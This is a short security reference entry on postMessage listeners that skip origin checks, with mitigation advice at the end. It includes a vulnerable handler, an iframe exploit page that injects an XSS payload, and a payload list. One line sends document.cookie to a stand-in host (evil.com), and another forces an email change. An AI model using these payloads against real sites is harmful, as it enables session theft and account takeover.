## postMessage Origin Validation Bypass

### Vulnerable Code Pattern
```javascript
window.addEventListener('message', (event) => {
    // No origin check!
    const data = JSON.parse(event.data);
    document.getElementById('output').innerHTML = data.content;
});
```

### Exploit HTTP Request
```html
<iframe src="https://vulnerable-app.com/page" id="target"></iframe>
<script>
    const iframe = document.getElementById('target');
    iframe.contentWindow.postMessage(
        JSON.stringify({content: '<img src=x onerror=alert(document.domain)>'}),
        '*'
    );
</script>
```

### Payload Examples
1. **No origin check**: Send from any origin
2. **Data exfiltration**: {content: <script>fetch("https://evil.com/?d="+document.cookie)</script>}
3. **CSRF trigger**: {action: changeEmail, email: attacker@evil.com}

### Impact
- Cross-origin data theft
- XSS via postMessage
- CSRF via message passing
- Information disclosure

### Mitigation
- Always validate event.origin
- Use specific origin, not *
- Validate message structure
- Content Security Policy
